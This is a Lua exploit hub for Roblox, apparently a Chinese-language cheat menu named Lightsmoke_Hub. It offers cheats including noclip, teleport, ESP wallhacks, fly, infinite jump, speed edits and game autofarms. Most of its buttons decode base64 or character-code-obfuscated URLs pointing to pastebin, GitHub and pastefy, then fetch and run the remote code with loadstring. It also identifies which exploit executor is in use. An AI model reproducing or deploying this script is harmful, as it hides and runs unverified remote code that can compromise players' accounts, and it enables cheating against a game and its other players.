local OrionLib
local HttpService = game:GetService("HttpService")
local success, err

local orionLibBase64 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0ZVZXgwZjNH"
success, err = pcall(function()
    local orionLink = HttpService:Base64Decode(orionLibBase64)
    OrionLib = loadstring(game:HttpGet(orionLink))()
end)

if not success then
    warn("OrionLib加载失败：" .. err)
    local WarnGui = Instance.new("ScreenGui", game.CoreGui)
    local WarnLabel = Instance.new("TextLabel", WarnGui)
    WarnLabel.Name = "LoadErrorLabel"
    WarnLabel.Size = UDim2.new(0, 350, 0, 50)
    WarnLabel.Position = UDim2.new(0.5, -175, 0.5, -25)
    WarnLabel.Text = "OrionLib加载失败，请检查链接或网络\n错误信息：" .. err
    WarnLabel.TextColor3 = Color3.new(1, 0, 0)
    WarnLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    WarnLabel.BackgroundTransparency = 0.5
    WarnLabel.TextScaled = true
    WarnLabel.TextWrapped = true
    return
end

print("反挂机开启")
local vu = game:GetService("VirtualUser")
game.Players.LocalPlayer.Idled:Connect(function()
    vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    task.wait(1)
    vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
end)

local LBLG = Instance.new("ScreenGui", game.CoreGui)
LBLG.Name = "FPSDisplayGui"
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
local LBL = Instance.new("TextLabel", LBLG)
LBL.Name = "FPSAndTimeLabel"
LBL.BackgroundColor3 = Color3.new(0, 0, 0)
LBL.BackgroundTransparency = 0.5
LBL.BorderColor3 = Color3.new(1, 1, 1)
LBL.Position = UDim2.new(0.01, 0, 0.01, 0)
LBL.Size = UDim2.new(0, 220, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "FPS: 加载中 | 当前时间: 加载中"
LBL.TextColor3 = Color3.new(1, 1, 1)
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true
local player = game.Players.LocalPlayer
local FpsLabel = LBL

local function identifyexecutor()
    if syn then
        return "Synapse X"
    elseif getgenv().SW then
        return "Script-Ware"
    elseif is_sirhurt_closure then
        return "SirHurt"
    elseif proto then
        return "ProtoSmasher"
    else
        return "嘻嘻不告诉你"
    end
end

local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = {tick()}
local function HeartbeatUpdate()
    LastIteration = tick()
    for Index = #FrameUpdateTable, 1, -1 do
        if FrameUpdateTable[Index] < LastIteration - 1 then
            table.remove(FrameUpdateTable, Index)
        end
    end
    table.insert(FrameUpdateTable, 1, LastIteration)
    
    local RunTime = LastIteration - Start
    local CurrentFPS = RunTime >= 1 and #FrameUpdateTable or (#FrameUpdateTable / RunTime)
    CurrentFPS = math.floor(CurrentFPS)
    
    local CurrentTime = os.date("%H时%M分%S秒")
    FpsLabel.Text = string.format("FPS: %d | 当前时间: %s", CurrentFPS, CurrentTime)
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)

local Window = OrionLib:MakeWindow({
    Name = "Lightsmoke_Hub",
    HidePremium = false,
    SaveConfig = true,
    IntroText = "欢迎使用Lightsmoke_Hub",
    ConfigFolder = "Lightsmoke_Hub"
})

local UserInfoTab = Window:MakeTab({
    Name = "用户信息",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
UserInfoTab:AddParagraph("用户名:"," "..player.Name.."")
UserInfoTab:AddParagraph("你的注入器:"," "..identifyexecutor().."")
UserInfoTab:AddParagraph("服务器的ID:"," "..game.GameId.."")
UserInfoTab:AddParagraph("配置保存路径:"," Roblox/PlayerData/[你的用户ID]/Config/Lightsmoke_Hub")

local HomeTab = Window:MakeTab({
    Name = "主页",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
HomeTab:AddButton({
    Name = "关闭Lightsmoke_Hub",
    Callback = function()
        Window:Destroy()
        LBLG:Destroy()
        warn("Lightsmoke_Hub已成功关闭")
    end
})

local Tab = Window:MakeTab({
	Name = "脚本Hub合集",
	Icon = "rbxassetid://7733779610",
	PremiumOnly = false
})
Tab:AddButton({
  Name = "XA_Hub",
  Callback = function()
    local xaHubBase64 = "aHR0cHM6Ly94aW5ndGFpZHVhbi5weXRob25hbnl3aGVyZS5jb20vTG9hZGVy"
    local xaLink = HttpService:Base64Decode(xaHubBase64)
    loadstring(game:HttpGet(xaLink))()
  end
})
Tab:AddButton({
  Name = "禁漫中心",
  Callback = function()
    getgenv().LS="禁漫中心"
    local jmBase64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20vZGluZGRpbmcxMjNoaGgvbmcvbWFpbi9qbWxsbGxsZUlJSUlsbGxsSUkuTHVh"
    local jmLink = HttpService:Base64Decode(jmBase64)
    loadstring(game:HttpGet(jmLink))()
  end
})
Tab:AddButton({
  Name = "情云脚本",
  Callback = function()
    loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
  end
})
Tab:AddButton({
    Name = "XK_Hub",
    Callback = function()
    local xkBase64 = "aHR0cHM6Ly9naXRodWIuY29tL0RldlNsb1BvL0RWRVMvcmF3L21haW4vWEsgSHVi"
    local xkLink = HttpService:Base64Decode(xkBase64)
    loadstring(game:HttpGet(xkLink))()
    end
})
Tab:AddButton({
	Name = "皮脚本",
	Callback = function()
    local piBase64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20veGlhb3BpNzcv eGlhb3BpNzcvbWFpbi9RUTEwMDIxMDAzMi1Sb2Jsb3gtUGktc2NyaXB0Lmx1YQ=="
    local piLink = HttpService:Base64Decode(piBase64)
    loadstring(game:HttpGet(piLink))()
  	end    
})

local Tab = Window:MakeTab({
	Name = "通用功能",
	Icon = "rbxassetid://7733779610",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "FPS(变流畅)",
	Callback = function()
    local fpsXBase64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20vZ2NsaWNoL0ZQUy1YLUdVSS9tYWluL0ZQU19YLmx1YQ=="
    local fpsXLink = HttpService:Base64Decode(fpsXBase64)
    loadstring(game:HttpGet(fpsXLink))()
  	end    
})
Tab:AddButton({
  Name = "HUA 光影",
  Callback = function()
    local huaBase64 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2FyekVDZ3dT"
    local huaLink = HttpService:Base64Decode(huaBase64)
    loadstring(game:HttpGet(huaLink))()
  end
})
Tab:AddButton({
  Name = "光影_2",
  Default = false,
  Callback = function()
    local gy2Base64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20vTVpFRU4yNDI0L0dyYXBoaWNzL21haW4vR3JhcGhpY3MueG1s"
    local gy2Link = HttpService:Base64Decode(gy2Base64)
    loadstring(game:HttpGet(gy2Link))()
  end
})
Tab:AddButton({
	Name = "超高画质",
	Callback = function()
    local hqBase64 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2pIQmZKWW1T"
    local hqLink = HttpService:Base64Decode(hqBase64)
    loadstring(game:HttpGet(hqLink))()
end
})    
Tab:AddToggle({
	Name = "夜视",
	Default = false,
	Callback = function(Value)
		if Value then
		    game.Lighting.Ambient = Color3.new(1, 1, 1)
		else
		    game.Lighting.Ambient = Color3.new(0, 0, 0)
		end
	end
})
Tab:AddButton({
	Name = "踏空行走",
	Callback = function()
    local floatBase64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20vR2hvc3RQbGF5ZXIyL1Rlc3Q0L21haW4vRmxvYXQ="
    local floatLink = HttpService:Base64Decode(floatBase64)
    loadstring(game:HttpGet(floatLink))()
	end
})
Tab:AddButton({
	Name = "点击传送工具",
	Callback = function()
mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "[FE] TELEPORT TOOL" tool.Activated:Connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack
	end
})

local Tab= Window:MakeTab({
	Name = "玩家",
	Icon = "rbxassetid://7733779610",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "无限跳",
    Default = false,
	Callback = function(Value)
    local wxtBase64 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1Y1UFF5M3kw"
    local wxtLink = HttpService:Base64Decode(wxtBase64)
    loadstring(game:HttpGet(wxtLink, true))()
	end
})
Tab:AddTextbox({
	Name = "跳跃高度设置",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
	end
})
Tab:AddTextbox({
	Name = "移动速度设置",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end
})
Tab:AddToggle({
	Name = "穿墙",
	Default = false,
	Callback = function(Value)
		if Value then
		    Noclip = true
		    Stepped = game.RunService.Stepped:Connect(function()
			    if Noclip == true then
				    for a, b in pairs(game.Workspace:GetChildren()) do
                        if b.Name == game.Players.LocalPlayer.Name then
                            for i, v in pairs(game.Workspace[game.Players.LocalPlayer.Name]:GetChildren()) do
                                if v:IsA("BasePart") then
                                    v.CanCollide = false
                                end
                            end
                        end
                    end
			    else
				    Stepped:Disconnect()
			    end
		    end)
	    else
		    Noclip = false
	    end
	end
})
Tab:AddButton({
	Name = "飞行",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
  	end
})
Tab:AddButton({
	Name = "透视",
	Callback = function()
local FillColor = Color3.fromRGB(175,25,255)
local DepthMode = "AlwaysOnTop"
local FillTransparency = 0.5
local OutlineColor = Color3.fromRGB(255,255,255)
local OutlineTransparency = 0
local CoreGui = game:FindService("CoreGui")
local Players = game:FindService("Players")
local lp = Players.LocalPlayer
local connections = {}
local Storage = Instance.new("Folder")
Storage.Parent = CoreGui
Storage.Name = "Highlight_Storage"
local function Highlight(plr)
    local Highlight = Instance.new("Highlight")
    Highlight.Name = plr.Name
    Highlight.FillColor = FillColor
    Highlight.DepthMode = DepthMode
    Highlight.FillTransparency = FillTransparency
    Highlight.OutlineColor = OutlineColor
    Highlight.OutlineTransparency = 0
    Highlight.Parent = Storage
    
    local plrchar = plr.Character
    if plrchar then
        Highlight.Adornee = plrchar
    end
    connections[plr] = plr.CharacterAdded:Connect(function(char)
        Highlight.Adornee = char
    end)
end
Players.PlayerAdded:Connect(Highlight)
for i,v in next, Players:GetPlayers() do
    Highlight(v)
end
Players.PlayerRemoving:Connect(function(plr)
    local plrname = plr.Name
    if Storage[plrname] then
        Storage[plrname]:Destroy()
    end
    if connections[plr] then
        connections[plr]:Disconnect()
    end
end)
  	end
})
Tab:AddButton({
	Name = "玩家进入提示",
	Callback = function()
    local tipBase64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20vYm95c2NwL3NjcmlzY3JpcHNjL21haW4vYmJuLmx1YQ=="
    local tipLink = HttpService:Base64Decode(tipBase64)
    loadstring(game:HttpGet(tipLink))()
  	end
})

local Tab = Window:MakeTab({
	Name = "黑暗欺骗",
	Icon = "rbxassetid://7733779610",
	PremiumOnly = false
})
Tab:AddButton({
  Name = "自动通关收集",
  Callback = function()
    local darkBase64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20vOWtuLTEvRGFyay9tYWluL0F1dG8ubHVh"
    local darkLink = HttpService:Base64Decode(darkBase64)
    loadstring(game:HttpGet(darkLink))()
  end
})

local Tab = Window:MakeTab({
	Name = "Ohio",
	Icon = "rbxassetid://7733779610",
	PremiumOnly = false
})
Tab:AddButton({
  Name = "雪花Ohio",
  Callback = function()
    local xhOhioBase64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20vY2FueGlhb3h1ZTY2Ni9TdHJpbmcvcmVmcy9oZWFkcy9tYWluL09oaW8zU2NyaXB0"
    local xhOhioLink = HttpService:Base64Decode(xhOhioBase64)
    loadstring(game:HttpGet(xhOhioLink))()
  end
})
Tab:AddButton({
  Name = "雪花另一个版本",
  Callback = function()
    local xh2OhioBase64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20vYWFhamFja21pbGxlci1odWIvRmFuZy9tYWluL3Nub3cgT2hpby5sdWE="
    local xh2OhioLink = HttpService:Base64Decode(xh2OhioBase64)
    loadstring(game:HttpGet(xh2OhioLink, true))()
  end
})
Tab:AddButton({
  Name = "XA",
  Callback = function()
    local xaOhioBase64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20vWGluZ3RhaWR1YW4vU2NyaXB0L3JlZnMvaGVhZHMvbWFpbi9HYW1lcy8lRTUlQTklQTklJTlklRTYlODklQTklRTUlQkUlOEMubHVh"
    local xaOhioLink = HttpService:Base64Decode(xaOhioBase64)
    loadstring(game:HttpGet(xaOhioLink))()
  end
})
Tab:AddButton({
  Name = "神青Ohio",
  Callback = function()
    local sqOhioBase64 = "aHR0cHM6Ly9yYXcuc2lnbmF0dXJlY29udGVudC5jb20vZ3ljZ2NoZ3lmeXRkdHRyL3NoZW5xaW4vcmVmcy9oZWFkcy9tYWluL29oaW8udHh0"
    local sqOhioLink = HttpService:Base64Decode(sqOhioBase64)
    loadstring(game:HttpGet(sqOhioLink))()
  end
})

local Tab = Window:MakeTab({
	Name = "其他",
	Icon = "rbxassetid://7733779610",
	PremiumOnly = false
})
Tab:AddButton({
  Name = "炉管脚本R6",
  Callback = function()
    local lgR6Base64 = "aHR0cHM6Ly9wYXN0ZWZ5LmFwcC93YTN2MlZnbS9yYXc="
    local lgR6Link = HttpService:Base64Decode(lgR6Base64)
    loadstring(game:HttpGet(lgR6Link))()
  end
})
Tab:AddButton({
  Name = "炉管脚本R15",
  Callback = function()
    local lgR15Base64 = "aHR0cHM6Ly9wYXN0ZWZ5LmFwcC9ZWm9nbE95Si9yYXc="
    local lgR15Link = HttpService:Base64Decode(lgR15Base64)
    loadstring(game:HttpGet(lgR15Link))()
  end
})
